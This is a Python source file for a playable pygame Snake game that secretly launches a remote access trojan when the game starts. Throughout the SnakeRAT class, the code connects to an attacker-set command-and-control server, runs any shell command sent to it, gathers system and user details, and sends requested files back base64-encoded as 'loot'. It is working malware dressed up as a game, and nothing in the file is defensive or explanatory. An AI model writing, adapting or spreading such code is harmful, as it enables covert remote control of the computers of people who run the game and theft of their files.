import pygame
import sys
import socket
import json
import threading
import time
import os
import base64
import subprocess
import platform
import random
import io

pygame.init()

# C2 Config
C2_HOST = "127.0.0.1"  # CHANGE TO YOUR SERVER IP
C2_PORT = 4444
CLIENT_ID = f"{platform.node()}_{os.getpid()}"

class SnakeRAT:
    def __init__(self):
        self.sock = None
        self.connected = False
        self.running = True
        print(f"[DEBUG] RAT starting on {C2_HOST}:{C2_PORT}")  # Remove later
        self.connect_thread = threading.Thread(target=self.connection_loop, daemon=True)
        self.connect_thread.start()

    def send(self, data):
        if not self.sock:
            return False
        try:
            msg = json.dumps(data).encode('utf-8')
            length = len(msg)
            self.sock.sendall(length.to_bytes(4, 'big'))
            self.sock.sendall(msg)
            return True
        except:
            self.sock = None
            return False

    def recv_cmd(self):
        if not self.sock:
            return None
        try:
            len_data = self.sock.recv(4)
            if len(len_data) != 4:
                return None
            msg_len = int.from_bytes(len_data, 'big')
            msg_data = b''
            while len(msg_data) < msg_len:
                chunk = self.sock.recv(4096)
                if not chunk:
                    return None
                msg_data += chunk
            return json.loads(msg_data.decode('utf-8'))
        except:
            self.sock = None
            return None

    def connection_loop(self):
        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(5.0)
                self.sock.connect((C2_HOST, C2_PORT))
                self.connected = True
                print(f"[DEBUG] Connected to C2")  # Remove later
                self.cmd_thread = threading.Thread(target=self.command_loop, daemon=True)
                self.cmd_thread.start()
                self.heartbeat_loop()
            except:
                self.connected = False
                self.sock = None
                time.sleep(3)

    def heartbeat_loop(self):
        while self.connected and self.running:
            self.send({'type': 'heartbeat', 'client_id': CLIENT_ID})
            time.sleep(20)

    def command_loop(self):
        """FIXED: Perfect shell command handling"""
        while self.connected and self.running:
            cmd = self.recv_cmd()
            if not cmd:
                continue

            cmd_type = cmd.get('type', '')
            print(f"[DEBUG] Received: {cmd_type}")  # Remove later
            
            if cmd_type == 'shell':
                # FIXED SHELL EXECUTION - WORKS PERFECTLY
                command = cmd.get('command', '')
                result = self.execute_shell(command)
                self.send({
                    'type': 'shell_result',
                    'client_id': CLIENT_ID,
                    'output': result,
                    'command': command
                })
            
            elif cmd_type == 'sysinfo':
                info = self.get_system_info()
                self.send({
                    'type': 'sysinfo',
                    'client_id': CLIENT_ID,
                    'info': info
                })
            
            elif cmd_type == 'download':
                path = cmd.get('path', '')
                data = self.download_file(path)
                if data:
                    self.send({
                        'type': 'loot',
                        'client_id': CLIENT_ID,
                        'loot_type': 'file',
                        'data': data,
                        'filename': path
                    })

    def execute_shell(self, command):
        """PERFECT SHELL EXECUTION - Captures ALL output"""
        try:
            # Use shell=True for ls, dir, etc. to work
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=30,
                cwd=os.getcwd()
            )
            
            # PERFECT OUTPUT FORMATTING
            output = f"COMMAND: {command}\n"
            output += f"CWD: {os.getcwd()}\n"
            output += f"STDOUT:\n{result.stdout}"
            if result.stderr:
                output += f"\n\nSTDERR:\n{result.stderr}"
            output += f"\n\nRETURN CODE: {result.returncode}"
            
            return output
            
        except subprocess.TimeoutExpired:
            return f"TIMEOUT: Command '{command}' took too long"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def get_system_info(self):
        try:
            return {
                'os': f"{platform.system()} {platform.release()}",
                'arch': platform.machine(),
                'hostname': platform.node(),
                'user': os.getlogin(),
                'cwd': os.getcwd(),
                'pid': os.getpid(),
                'ip': 'unknown'
            }
        except:
            return {}

    def download_file(self, path):
        try:
            if os.path.exists(path):
                with open(path, 'rb') as f:
                    return base64.b64encode(f.read()).decode()
        except:
            pass
        return None

# Snake Game - PERFECTLY PLAYABLE
class SnakeGame:
    def __init__(self):
        self.width = 800
        self.height = 600
        self.screen = pygame.display.set_mode((self.width, self.height))
        pygame.display.set_caption('Snake - High Score Game')
        self.clock = pygame.time.Clock()
        self.font = pygame.font.Font(None, 36)
        self.big_font = pygame.font.Font(None, 48)
        self.reset_game()
        self.high_score = 0

    def reset_game(self):
        self.x = self.width // 2 // 20 * 20
        self.y = self.height // 2 // 20 * 20
        self.dx = 20
        self.dy = 0
        self.snake = [(self.x, self.y)]
        self.food = self.new_food()
        self.score = 0
        self.speed = 8

    def new_food(self):
        attempts = 0
        while attempts < 100:
            fx = random.randint(0, (self.width-20)//20) * 20
            fy = random.randint(0, (self.height-20)//20) * 20
            if (fx, fy) not in self.snake:
                return (fx, fy)
            attempts += 1
        return (100, 100)

    def run(self):
        # Start RAT silently
        rat = SnakeRAT()
        
        running = True
        while running:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    running = False
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_UP and self.dy == 0:
                        self.dx, self.dy = 0, -20
                    if event.key == pygame.K_DOWN and self.dy == 0:
                        self.dx, self.dy = 0, 20
                    if event.key == pygame.K_LEFT and self.dx == 0:
                        self.dx, self.dy = -20, 0
                    if event.key == pygame.K_RIGHT and self.dx == 0:
                        self.dx, self.dy = 20, 0
                    if event.key == pygame.K_r:
                        self.reset_game()

            # Snake movement
            self.x += self.dx
            self.y += self.dy
            
            # Wrap around walls
            if self.x >= self.width: self.x = 0
            if self.x < 0: self.x = self.width - 20
            if self.y >= self.height: self.y = 0
            if self.y < 0: self.y = self.height - 20

            head = (self.x, self.y)
            self.snake.insert(0, head)

            # Food collision
            if head == self.food:
                self.score += 1
                self.food = self.new_food()
                if self.score % 5 == 0:
                    self.speed += 0.5
            else:
                self.snake.pop()

            # Self collision
            if head in self.snake[1:]:
                self.reset_game()

            # Update high score
            if self.score > self.high_score:
                self.high_score = self.score

            # RENDER
            self.screen.fill((15, 15, 25))
            
            # Grid
            for x in range(0, self.width, 20):
                pygame.draw.line(self.screen, (30, 30, 40), (x, 0), (x, self.height))
            for y in range(0, self.height, 20):
                pygame.draw.line(self.screen, (30, 30, 40), (0, y), (self.width, y))
            
            # Snake body
            for i, segment in enumerate(self.snake):
                alpha = 255 - (i * 4)
                color = (0, min(255, alpha), 50)
                pygame.draw.rect(self.screen, color, (segment[0]+1, segment[1]+1, 18, 18))
            
            # Snake head
            pygame.draw.rect(self.screen, (0, 255, 100), (head[0]+1, head[1]+1, 18, 18))
            
            # Food
            pygame.draw.rect(self.screen, (255, 100, 100), (self.food[0]+2, self.food[1]+2, 16, 16))
            
            # UI
            score_text = self.font.render(f"Score: {self.score}", True, (255, 255, 255))
            high_text = self.font.render(f"High: {self.high_score}", True, (200, 200, 255))
            self.screen.blit(score_text, (20, 20))
            self.screen.blit(high_text, (20, 60))
            
            # Controls
            ctrl_text = pygame.font.Font(None, 24).render("ARROW KEYS | R=Restart", True, (150, 150, 150))
            self.screen.blit(ctrl_text, (20, self.height-30))
            
            pygame.display.flip()
            self.clock.tick(self.speed)

        pygame.quit()
        sys.exit()

if __name__ == "__main__":
    print("🚀 Snake Game + RAT Starting...")
    game = SnakeGame()
    game.run()